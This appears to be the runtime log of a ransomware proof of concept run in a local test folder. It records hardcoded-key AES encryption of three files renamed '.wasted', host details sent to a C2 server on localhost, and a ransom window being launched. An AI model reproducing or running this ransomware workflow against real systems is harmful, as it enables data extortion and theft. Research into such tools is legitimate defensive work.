2025-06-25 11:23:09,223 - INFO - ============================================================
2025-06-25 11:23:09,224 - INFO - RANSOMWARE PoC ACTIVITY LOG STARTED
2025-06-25 11:23:09,225 - INFO - ============================================================
2025-06-25 11:23:09,226 - INFO - Log file: logs/ransomware_activity_20250625_112309.log
2025-06-25 11:23:09,226 - INFO - Timestamp: 2025-06-25 11:23:09
2025-06-25 11:23:09,432 - INFO - Platform: Windows 11
2025-06-25 11:23:09,433 - INFO - Python version: 3.13.5 (tags/v3.13.5:6cb20a2, Jun 11 2025, 16:15:46) [MSC v.1943 64 bit (AMD64)]
2025-06-25 11:23:09,433 - INFO - User: mudit
2025-06-25 11:23:09,434 - INFO - Hostname: Mudityadev
2025-06-25 11:23:09,434 - INFO - ============================================================
2025-06-25 11:23:09,434 - INFO - Starting main function
2025-06-25 11:23:09,435 - INFO - Parsing command line arguments
2025-06-25 11:23:09,435 - INFO - Setting up argument parser
2025-06-25 11:23:09,436 - INFO - Parsing command line arguments
2025-06-25 11:23:09,437 - INFO - Arguments parsed - Path: D:\AI-Agent\Ransomware-PoC\testDir, Encrypt: True, Decrypt: False
2025-06-25 11:23:09,438 - INFO - Operation mode: ENCRYPT
2025-06-25 11:23:09,438 - INFO - Target path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:23:09,438 - INFO - Using specified path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:23:09,438 - INFO - Initializing RSA encryption for AES key
2025-06-25 11:23:09,506 - INFO - AES key encrypted with RSA public key
2025-06-25 11:23:09,507 - INFO - Encrypted key (base64): GeRYWwqUOizhrAG11zClOZitw6KMgS3bNNSssXlhsS/DbdzmQ4BKMREVsCkL/2jayLkIUGhBfZqrGDupRhO3wQ5JmGJgOTggsXZ1hKhPfXmLF2fQGFchbq2NEp27vD7c14N/qwha7vxxTE3/XgNARJeHCaU43GIwdTPsBqnud4o+BTYEd6z4eqbzAy+DbiG4WmwKa+vc+EZXntmz2FqhQ81ZzfcDhwodaxDW6xZEYP1OoohDsbooFeiSmdznah7GCWeshnKEkchZN4/ezCKdHI51mJZZCZ8r+HY4UQ5vBeCRoePaj5za3+qc6J/3RhY6DssExZ5Xke5CIaTM86Z94w==
2025-06-25 11:23:09,508 - INFO - Using hardcoded AES key for encryption
2025-06-25 11:23:09,509 - INFO - Creating AES cipher with CTR mode
2025-06-25 11:23:09,516 - INFO - Starting file discovery and processing
2025-06-25 11:23:09,517 - INFO - Processing directory: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:23:09,519 - INFO - Discovered 3 files in D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:23:09,519 - INFO - Encrypting file: D:\AI-Agent\Ransomware-PoC\testDir\testPasswords.txt
2025-06-25 11:23:09,523 - INFO - Successfully encrypted: D:\AI-Agent\Ransomware-PoC\testDir\testPasswords.txt -> D:\AI-Agent\Ransomware-PoC\testDir\testPasswords.txt.wasted
2025-06-25 11:23:09,524 - INFO - Encrypting file: D:\AI-Agent\Ransomware-PoC\testDir\importantFile\fdsggg.txt
2025-06-25 11:23:09,526 - INFO - Successfully encrypted: D:\AI-Agent\Ransomware-PoC\testDir\importantFile\fdsggg.txt -> D:\AI-Agent\Ransomware-PoC\testDir\importantFile\fdsggg.txt.wasted
2025-06-25 11:23:09,527 - INFO - Encrypting file: D:\AI-Agent\Ransomware-PoC\testDir\importantFile\New Text Document - Copy.txt
2025-06-25 11:23:09,529 - INFO - Successfully encrypted: D:\AI-Agent\Ransomware-PoC\testDir\importantFile\New Text Document - Copy.txt -> D:\AI-Agent\Ransomware-PoC\testDir\importantFile\New Text Document - Copy.txt.wasted
2025-06-25 11:23:09,530 - INFO - Total files processed: 3
2025-06-25 11:23:09,530 - INFO - Starting key exfiltration and GUI launch
2025-06-25 11:23:09,530 - INFO - Attempting to connect to C2 server: 127.0.0.1:8080
2025-06-25 11:23:09,552 - INFO - Retrieving local IP address
2025-06-25 11:23:09,553 - INFO - Local IP address: 192.168.217.136
2025-06-25 11:23:09,554 - INFO - Successfully sent data to C2 server: 127.0.0.1:8080
2025-06-25 11:23:09,555 - INFO - Sent data includes: IP=192.168.217.136, User=mudit, Hostname=Mudityadev, TargetDir=D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 11:23:09,555 - INFO - Launching GUI window
2025-06-25 11:23:20,009 - INFO - Received keyboard interrupt, exiting
